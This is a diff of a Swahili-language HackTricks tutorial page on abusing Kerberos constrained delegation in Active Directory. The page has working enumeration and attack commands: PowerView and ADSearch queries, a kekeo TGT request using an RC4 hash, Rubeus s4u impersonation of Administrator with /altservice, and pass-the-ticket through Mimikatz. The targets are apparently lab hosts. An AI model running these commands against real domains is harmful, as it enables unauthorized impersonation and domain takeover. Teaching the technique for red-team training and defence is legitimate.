@@ -1,35 +1,36 @@
-# Kizuizi cha Utekelezaji
+# Constrained Delegation
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi kuwa bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Njia nyingine za kusaidia HackTricks:
-
-* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
-## Kizuizi cha Utekelezaji
+## Constrained Delegation
 
-Kwa kutumia hii, msimamizi wa kikoa anaweza **kuruhusu** kompyuta kujifanya kuwa mtumiaji au kompyuta dhidi ya **huduma** ya kifaa.
+Kwa kutumia hii, msimamizi wa Domain anaweza **kuruhusu** kompyuta **kujifanya** kama mtumiaji au kompyuta dhidi ya **huduma** ya mashine.
 
-* **Huduma kwa Mtumiaji mwenyewe (**_**S4U2self**_**):** Ikiwa akaunti ya **huduma** ina thamani ya _userAccountControl_ inayojumuisha [TRUSTED\_TO\_AUTH\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx) (T2A4D), basi inaweza kupata TGS kwa niaba yake (huduma) kwa niaba ya mtumiaji mwingine yeyote.
-* **Huduma kwa Mwakilishi wa Mtumiaji(**_**S4U2proxy**_**):** Akaunti ya **huduma** inaweza kupata TGS kwa niaba ya mtumiaji yeyote kwa huduma iliyoainishwa katika **msDS-AllowedToDelegateTo.** Ili kufanya hivyo, kwanza inahitaji TGS kutoka kwa mtumiaji huyo kwake mwenyewe, lakini inaweza kutumia S4U2self kupata TGS hiyo kabla ya kuomba nyingine.
+* **Huduma kwa Mtumiaji kujitenga (**_**S4U2self**_**):** Ikiwa **akaunti ya huduma** ina thamani ya _userAccountControl_ inayojumuisha [TRUSTED\_TO\_AUTH\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx) (T2A4D), basi inaweza kupata TGS kwa ajili yake mwenyewe (huduma) kwa niaba ya mtumiaji mwingine yeyote.
+* **Huduma kwa Mtumiaji Proxy(**_**S4U2proxy**_**):** **Akaunti ya huduma** inaweza kupata TGS kwa niaba ya mtumiaji yeyote kwa huduma iliyowekwa katika **msDS-AllowedToDelegateTo.** Ili kufanya hivyo, kwanza inahitaji TGS kutoka kwa mtumiaji huyo kwa ajili yake mwenyewe, lakini inaweza kutumia S4U2self kupata TGS hiyo kabla ya kuomba nyingine.
 
-**Note**: Ikiwa mtumiaji ameandikwa kama '_Akaunti ni nyeti na haiwezi kupelekwa_ ' katika AD, hautaweza **kujifanya kuwa** wao.
+**Kumbuka**: Ikiwa mtumiaji amewekwa alama kama ‘_Akaunti ni nyeti na haiwezi kuhamasishwa_’ katika AD, huwezi **kujifanya** kama wao.
 
-Hii inamaanisha kuwa ikiwa unafanikiwa **kudukua hash ya huduma** unaweza **kujifanya kuwa watumiaji** na kupata **upatikanaji** kwa niaba yao kwenye **huduma iliyowekwa** (uwezekano wa **privesc**).
+Hii inamaanisha kwamba ikiwa unapata **hash ya huduma** unaweza **kujifanya kama watumiaji** na kupata **ufikiaji** kwa niaba yao kwa **huduma iliyowekwa** (inawezekana **privesc**).
 
-Zaidi ya hayo, hautakuwa na upatikanaji tu kwa huduma ambayo mtumiaji anaweza kujifanya kuwa, lakini pia kwa huduma yoyote kwa sababu jina la SPN (jina la huduma inayohitajika) halijachunguzwa, bali haki tu. Kwa hivyo, ikiwa una upatikanaji wa **huduma ya CIFS** unaweza pia kupata upatikanaji wa **huduma ya HOST** kwa kutumia bendera ya `/altservice` katika Rubeus.
+Zaidi ya hayo, **hutakuwa na ufikiaji tu kwa huduma ambayo mtumiaji anaweza kujifanya, bali pia kwa huduma yoyote** kwa sababu SPN (jina la huduma iliyohitajika) halijakaguliwa, ni ruhusa pekee. Hivyo, ikiwa una ufikiaji kwa **huduma ya CIFS** unaweza pia kuwa na ufikiaji kwa **huduma ya HOST** kwa kutumia bendera ya `/altservice` katika Rubeus.
 
-Pia, upatikanaji wa **huduma ya LDAP kwenye DC**, ndio unahitajika kudukua **DCSync**.
+Pia, **ufikiaji wa huduma ya LDAP kwenye DC**, ndio inahitajika ili kutumia **DCSync**.
 
-{% code title="Tambua" %}
+{% code title="Enumerate" %}
 ```bash
 # Powerview
 Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
@@ -38,6 +39,8 @@ Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowed
 #ADSearch
 ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
 ```
+{% endcode %}
+
 {% code title="Pata TGT" %}
 ```bash
 # The first step is to get a TGT of the service that can impersonate others
@@ -60,12 +63,12 @@ tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140
 {% endcode %}
 
 {% hint style="warning" %}
-Kuna njia **nyingine za kupata tiketi ya TGT** au **RC4** au **AES256** bila kuwa SYSTEM kwenye kompyuta kama kosa la Printer na kutozuia utekelezaji, kusambaza NTLM na unyanyasaji wa Huduma ya Cheti ya Active Directory.
+Kuna **njia nyingine za kupata tiketi ya TGT** au **RC4** au **AES256** bila kuwa SYSTEM kwenye kompyuta kama Printer Bug na unconstrained delegation, NTLM relaying na matumizi mabaya ya Active Directory Certificate Service
 
-**Kwa kuwa na tiketi ya TGT (au iliyohashwa) unaweza kufanya shambulio hili bila kuhatarisha kompyuta nzima.**
+**Kuwa na tiketi hiyo ya TGT (au iliyohashwa) unaweza kufanya shambulio hili bila kuathiri kompyuta nzima.**
 {% endhint %}
 
-{% code title="Kutumia Rubeus" %}
+{% code title="Using Rubeus" %}
 ```bash
 #Obtain a TGS of the Administrator user to self
 .\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator
@@ -82,6 +85,8 @@ Kuna njia **nyingine za kupata tiketi ya TGT** au **RC4** au **AES256** bila kuw
 #Load ticket in memory
 .\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
 ```
+{% endcode %}
+
 {% code title="kekeo + Mimikatz" %}
 ```bash
 #Obtain a TGT for the Constained allowed user
@@ -97,16 +102,17 @@ Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.
 
 [**Maelezo zaidi katika ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
 
+{% hint style="success" %}
+Jifunze na fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Jifunze na fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Njia nyingine za kusaidia HackTricks:
-
-* Ikiwa unataka kuona **kampuni yako ikionekana katika HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
+* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuatilie** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Shiriki mbinu za hacking kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
+{% endhint %}
